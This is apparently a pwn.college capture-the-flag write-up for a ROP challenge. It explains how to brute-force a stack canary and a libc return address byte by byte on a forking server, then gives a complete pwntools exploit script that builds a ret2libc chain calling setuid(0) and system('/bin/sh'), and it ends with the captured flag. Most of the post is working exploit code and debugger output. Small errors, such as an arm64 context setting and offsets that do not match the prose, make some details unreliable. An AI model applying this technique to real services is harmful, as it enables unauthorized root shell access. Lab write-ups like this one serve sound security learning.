---
layout: post
title: (ROP) level 15
categories: pwn.college ROP
date: 2025-07-15 13:22:22 +0300
tags: ROP pwn.college stack-canary brute-force PIE ASLR ret2libc partial-overwrite kill-process
---

## Information 
- category: pwn

## Description 
> Perform ROP when the stack frame returns to libc!


## Write-up
**Connecting to the Challenge**

When you connect to the server at ```127.0.0.1``` on port ```1337``` using ```nc```, you'll notice that the program waits for input but gives no immediate output:
```bash
nc 127.0.0.1 1337
ABCD
Leaving!
### Goodbye!
```

**Protections in Place**
The binary has multiple protections enabled:
- ✅ **Stack** Canary
- ✅ **ASLR** (Address Space Layout Randomization)

There’s **no direct leak**, so we need to **bypass all of them** in order to build a successful exploit.

```bash
checksec babyrop_level15.1
[*] '/home/k1k0/Desktop/program-security-dojo/return-oriented-programming/level-15-1/_0/babyrop_level15.1'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

**Brute-Forcing the Stack Canary**
Since the program is running as a **forking server** and allows **unlimited reconnections**, we can **brute-force the stack canary one byte at a time**.

This method works because:  
- The canary is **at a fixed offset** from the input buffer. 
- The server forks a new process for each connection, so even if we crash one, the next attempt is fresh. 
- We can reuse the crash information to determine **which byte guess was correct**.

> This method is reliable as long as the process resets and the canary stays consistent between forks.
{: .prompt-tip}

We’ll use `pwndbg` to determine this offset by:
```plaintext
Thread 3.1 "babyrop_level15" hit Breakpoint 1, 0x00005f1a465d53a6 in main ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
─────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────────────────────────
 ► 0x5f1a465d53a6 <main+544>    call   read@plt                    <read@plt>
        fd: 0 (socket:[920827124])
        buf: 0x7ffc2f72e1c0 —▸ 0x5f1a465d3040 ◂— 0x400000006
        nbytes: 0x1000
───────────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7ffc2f72e160 ◂— 0
01:0008│-0b8 0x7ffc2f72e168 —▸ 0x7ffc2f72e328 —▸ 0x7ffc2f730154 ◂— 'SHELL=/run/dojo/bin/bash'
02:0010│-0b0 0x7ffc2f72e170 —▸ 0x7ffc2f72e318 —▸ 0x7ffc2f730137 ◂— '/challenge/babyrop_level15.1'
03:0018│-0a8 0x7ffc2f72e178 ◂— 0x100000000
─────────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────────
 ► 0   0x5f1a465d53a6 main+544
   1   0x78ac5dda3083 __libc_start_main+243
   2   0x5f1a465d426e _start+46
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> i f
Stack level 0, frame at 0x7ffc2f72e230:
 rip = 0x5f1a465d53a6 in main; saved rip = 0x78ac5dda3083
 called by frame at 0x7ffc2f72e300
 Arglist at 0x7ffc2f72e220, args: 
 Locals at 0x7ffc2f72e220, Previous frame's sp is 0x7ffc2f72e230
 Saved registers:
  rbp at 0x7ffc2f72e220, rip at 0x7ffc2f72e228
pwndbg> dist $rsi 0x7ffc2f72e228
0x7ffc2f72e1c0->0x7ffc2f72e228 is 0x68 bytes (0xd words)
pwndbg> 
```
> This offset tells us exactly how many bytes to send before reaching the canary.
{: .prompt-tip}

**Brute-Forcing the Frok to Bypass ASLR**

We already brute-forced the **stack canary**, and now we want to **find the full address of fork** on the stack to bypass **ASLR**.
From the program behavior, we know:

- When the **correct return address** is in place, the program prints `r"(\d+):\ttransferring control"` — this gives us clear feedback during brute-forcing.

- ASLR randomizes the **base address** of the libc every run.
- But if we know the address of `fork`, and we know the offset of `fork` , we can calculate the base address like this:
```plaintext
lib_base = ret_address - offset_of_fork
```

> This technique allows us to defeat ASLR without a memory leak — just behavior-based brute force.
{: .prompt-info}


## Exploit
```python
#!/usr/bin/env python3

from pwn import *
import re
import os
import signal

context(log_level="debug",arch="arm64")
offset_canary = 0x58
offset_fork = 0x23ff0


def brute_force(typeA,start=b"",canary=b"",length=8):
    current = start 
    while len(current) < length:
        for byte in range(0x0,0x100):
            try:
                with remote("127.0.0.1",1337) as p:
                    if typeA == "canary":
                        payload = b"A"*offset_canary + current + p8(byte)
                    elif typeA == "ret":
                        payload = b"A"*offset_canary + canary + b"B"*8 + current + p8(byte)
                    else:
                        log.warning(f"Error while build payload in {typeA}.")
                    
                    p.send(payload)
                    res = p.recvall(timeout=2)

                    if (typeA == "canary" and b"*** stack" not in res 
                    ) or (typeA == "ret" and b"transferring control" in res ):
                        current += p8(byte)

                        if typeA == "ret":
                            strPid = r"(\d+):\ttransferring control"
                            findIntPid = re.findall(strPid,res.decode("utf-8",errors="ignore"))
                            if findIntPid and findIntPid[0].isdigit():
                                try:
                                    pid = int(findIntPid[0])
                                    os.kill(pid,signal.SIGTERM)
                                    log.info(f"KILL PID {pid}.")
                                except Exception as e:
                                    log.warning(f"Error in killing pid: {e}.")
                            else:
                                log.warning(f"PID Not Found.")
                        break
            except Exception as e:
                log.warning(f"Error: {e}.")

    return current

def payload(canary,ret):
    libase = u64(ret.ljust(8,b"\x00")) - offset_fork
    lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")
    lib.address = libase
    
    rop = ROP(lib)

    return flat(
        b"A"*offset_canary,
        canary,
        b"B"*8,

        rop.ret.address,
        rop.rdi.address,
        0,
        lib.symbols["setuid"],

        rop.ret.address,
        rop.rdi.address,
        next(lib.search(b"/bin/sh\x00")),
        lib.symbols["system"],
    )

def attack():
    canary = brute_force("canary",start=b"\x00")
    ret = brute_force("ret",start=b"\xf0",canary=canary,length=6)

    log.success(f"Canary: {canary}.")
    log.success(f"Fork(): {ret}.")

    with remote("127.0.0.1",1337) as p:
        try:
            p.send(payload(canary,ret))
            p.interactive()
        except Exception as e:
            log.warning(f"Fail send payload: {e}.")

def main():
    attack()

if __name__ == "__main__":
    main()
```
## Flag
> Flag: ``` pwn.college{3QnRr5bCZGvxO9.APxAhJXCKPif-0VO2MDLwczN4czW}```




